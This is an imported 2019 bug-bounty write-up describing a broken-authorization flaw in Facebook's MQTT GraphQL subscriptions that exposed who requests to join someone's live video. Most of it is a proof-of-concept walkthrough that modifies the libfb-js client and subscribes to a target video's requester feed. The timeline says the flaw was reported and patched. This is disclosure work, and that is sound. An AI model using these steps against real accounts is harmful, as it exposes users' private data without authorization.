---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-09-10_subscribe-to-the-list-of-requesters-to-join-a-facebook-live-video-using-mqtt.md
original_filename: 2019-09-10_subscribe-to-the-list-of-requesters-to-join-a-facebook-live-video-using-mqtt.md
title: Subscribe to the list of requesters to join a Facebook live video using MQTT
category: documents
detected_topics:
- access-control
- command-injection
- otp
- graphql
- supply-chain
tags:
- imported
- documents
- access-control
- command-injection
- otp
- graphql
- supply-chain
language: en
raw_sha256: 0edd807218e6554646dba3673e6b7af633450e1a56180b4a85b8e3464cd2e2eb
text_sha256: 8361682c1bf1ec4e66ace05ce0c7615b4ebe58902189a8ebae84e3e8817786db
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: true
---

# Subscribe to the list of requesters to join a Facebook live video using MQTT

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-09-10_subscribe-to-the-list-of-requesters-to-join-a-facebook-live-video-using-mqtt.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, otp, graphql, supply-chain
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: True
- Raw SHA256: `0edd807218e6554646dba3673e6b7af633450e1a56180b4a85b8e3464cd2e2eb`
- Text SHA256: `8361682c1bf1ec4e66ace05ce0c7615b4ebe58902189a8ebae84e3e8817786db`


## Content

---
title: "Subscribe to the list of requesters to join a Facebook live video using MQTT"
page_title: "Subscribe to the list of requesters to join a Facebook live video using MQTT - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/subscribe-to-the-list-of-requesters-to-join-a-facebook-live-video-using-mqtt/"
final_url: "https://philippeharewood.com/subscribe-to-the-list-of-requesters-to-join-a-facebook-live-video-using-mqtt/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["Broken authorization"]
publication_date: "2019-09-10"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5038
---

Posted on [September 10, 2019](https://philippeharewood.com/subscribe-to-the-list-of-requesters-to-join-a-facebook-live-video-using-mqtt/)

# Subscribe to the list of requesters to join a Facebook live video using MQTT

Facebook provides subscriptions to send updates based on various calls in desktop and mobile. When any user starts a public live video it is possible to subscribe to those who request to join as a co-broadcaster.  

**Setup**

MQTT client  
<https://github.com/ChatPlug/libfb-js/>

`git clone <https://github.com/ChatPlug/libfb-js/>  
cd libfb-js/  
git checkout ***REDACTED-SUSPECT-TOKEN***npm install #for any dependencies`

1\. Start a pubic live video as a user and grab the VIDEO_ID

2\. Log the MQTT packets

In` ./src/mqtt/MqttApi.ts` for libfb-js  
Append after line 165

`const publish = decodePublish(packet)`

the following,

`debugLog(publish.data.toString())`

This allows us to see the contents of the received messages

3\. Add a subscription to the topic list.

In `./src/mqtt/messages/Subscribe.ts`  
Edit the list at `const topics `so that the following item is added at the end, replacing `VIDEO_ID` for the live video of the target user in step 1.

`const topics = [  
"/inbox",  
"/messaging_events",  
"/t_ms",  
"/t_rtc",  
"/webrtc",  
"/webrtc_response",  
'/graphql/3/graphqlsubscriptions/0/467768180440642/{\"input\":{\"client_subscription_id\":\"SOME-ID-HERE\",\"video_id\":\"VIDEO_ID\"}}'  
]`

The format of this subscription is

`graphql/3/graphqlsubscriptions/0/QUERYID/{input:{variables}}`

4\. Create the MQTT setup

`import { login } from './src/FBMessenger'  
require("console-stamp")(console, "[HH:MM:ss.l]")  
  
async function main() {  
  
const api = await login('malicioususer@gmail.com', 'YOUR_PASSWORD', {})  
console.log('Logged in!')  
api.on('event', console.dir)  
}  
main()`

Add the following to a file `poc.ts` in the base of the repository

5\. Start the program

`DEBUG=fblib ts-node poc.ts`

This should work when the messages are received as the following  
  
`fblib Data received! +0ms  
fblib Last header size: 0 +0ms  
fblib Packet size: 2 +0ms  
fblib Current buffer size: 0 +0ms  
fblib Received buffer size: 2 +0ms  
fblib Packet type: Pong +27s`

6\. As a third user send a join request to the video (green icon, when watching the live video mode on mobile)

7\. The subscription for the request should show up for the malicioususer@gmail.com that signed into the MQTT client in step 4.  
  
`fblib Packet type: Publish +14s  
fblib {"live_with_request_to_join_broadcaster_subscribe":{"requester":{"__typename":"User","id":"1","name":"Some User","profilePicture50":{"uri":"https:\/\/scontent.xx.fbcdn.net\/","scale":1,"name":null,"width":50,"height":50}},"request_type":"JOIN_UNREQUEST"}} +0ms  
fblib /graphql/3/graphqlsubscriptions/0/467768180440642/{"input":{"client_subscription_id":"SOME-ID-HERE","video_id":"VIDEO_ID"}} +3m`

**Impact**

This could have let someone subscribe to people requesting to join a video as a Co-Host.

**Timeline**  
  
Sep 10, 2019 – Report sent  
Sep 11, 2019 – Confirmation of submission by Facebook  
Sep 21, 2019 – Bounty awarded by Facebook  
Oct 24, 2019 – Confirmation of patch by Facebook
